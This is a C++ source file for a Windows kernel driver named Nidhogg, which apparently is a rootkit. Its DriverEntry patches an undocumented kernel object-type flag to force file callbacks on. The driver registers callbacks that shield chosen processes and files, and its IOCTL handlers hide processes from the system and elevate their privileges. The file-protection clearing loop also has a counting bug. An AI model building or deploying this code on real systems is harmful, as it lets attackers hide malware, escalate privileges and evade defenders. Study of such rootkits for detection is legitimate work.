#include "pch.h"
#include "Nidhogg.h"
#include "ProcessUtils.hpp"
#include "FileUtils.hpp"

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	auto status = STATUS_SUCCESS;
	pGlobals.Init();
	fGlobals.Init();

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Nidhogg");
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\Nidhogg");
	PDEVICE_OBJECT DeviceObject = nullptr;

	 // Enabling file callbacks.
	POBJECT_TYPE ObjectTypeTemp = (POBJECT_TYPE)*IoFileObjectType;
	*(UCHAR*)((UINT64)ObjectTypeTemp + SupportsObjectCallbacks) = AllowObjectCallbacks;

	// Registering the process hooking function.
	OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,		// object type
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr	// pre, post
		},
		{
			IoFileObjectType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreFileOperation, nullptr
		}
	};
	OB_CALLBACK_REGISTRATION registrationCallbacks = {
		OB_FLT_REGISTRATION_VERSION,
		2,				// operation count
		RTL_CONSTANT_STRING(L"31105.6171"),		// altitude
		nullptr,		// context
		operations
	};

	status = ObRegisterCallbacks(&registrationCallbacks, &registrationHandle);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to register callbacks: (0x%08X)\n", status));
		return status;
	}

	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to create device: (0x%08X)\n", status));
		ObUnRegisterCallbacks(registrationHandle);
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		ObUnRegisterCallbacks(registrationHandle);
		KdPrint((DRIVER_PREFIX "failed to create symbolic link: (0x%08X)\n", status));
		return status;
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
	return status;
}


void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	ObUnRegisterCallbacks(registrationHandle);

	KdPrint((DRIVER_PREFIX "Unloaded\n"));

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Nidhogg");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}


NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);
	return status;
}


NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	auto len = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_NIDHOGG_PROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];
			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			if (FindProcess(pid))
				continue;

			if (pGlobals.PidsCount == MAX_PIDS) {
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (!AddProcess(pid)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			len += sizeof(ULONG);
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!RemoveProcess(pid)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			len += sizeof(ULONG);

			if (pGlobals.PidsCount == 0)
				break;
		}

		break;
	}

	case IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION:
	{
		AutoLock locker(pGlobals.Lock);
		memset(&pGlobals.Pids, 0, sizeof(pGlobals.Pids));
		pGlobals.PidsCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_HIDE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!NT_SUCCESS(HideProcess(pid))) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}

	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!NT_SUCCESS(ElevateProcess(data[i]))) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}

	case IOCTL_NIDHOGG_PROTECT_FILE:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (fGlobals.FilesCount == MAX_FILES) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!FindFile(data)) {
			if (!AddFile(data)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_FILE:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (!RemoveFile(data)) {
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION:
	{
		AutoLock locker(fGlobals.Lock);

		for (int i = 0; i < fGlobals.FilesCount; i++) {
			ExFreePoolWithTag(fGlobals.Files[i], DRIVER_TAG);
			fGlobals.Files[i] = nullptr;
			fGlobals.FilesCount--;
		}

		fGlobals.FilesCount = 0;
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
